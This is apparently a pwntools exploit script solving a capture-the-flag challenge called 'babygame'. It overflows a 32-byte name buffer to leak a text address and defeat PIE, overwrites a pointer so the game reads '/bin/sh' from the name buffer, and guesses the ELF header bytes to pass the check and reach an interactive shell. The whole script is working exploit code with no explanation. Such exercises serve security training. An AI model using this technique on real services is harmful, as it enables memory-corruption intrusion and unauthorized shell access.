#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./babygame"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *game+120
        b *set_username+67
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def set_name(name):
    p.sendlineafter("> ", '1')
    p.sendafter("to?", name)

def print_name():
    p.sendlineafter("> ", '2')
    return p.recvline().rstrip(b'\n')

def game(guess):
    p.sendlineafter("> ", '1337')
    p.sendlineafter("guess:", guess)



# leak text address
p.sendlineafter('?', b'A' * 32)
p.recvuntil("Invalid")
randbuf_addr = u64(print_name()[32:39] + b'\00' * 2)
log.info("RANDNUM: " + hex(randbuf_addr))
text_base = randbuf_addr - 0x2024
log.info("text base: " + hex(text_base))
name_addr = text_base + 0x40a0
log.info("NAME: " + hex(name_addr))

# overwrite NAME & RANDNUM -> NAME
payload = b'/bin/sh\0'
payload += b'B' * (32 - len(payload))
payload += p64(name_addr)
set_name(payload)

# babygame!
elf_header_4_byte = b'\x7fELF'
super_guess = int.from_bytes(elf_header_4_byte, byteorder='little')
game(str(super_guess))


p.interactive()
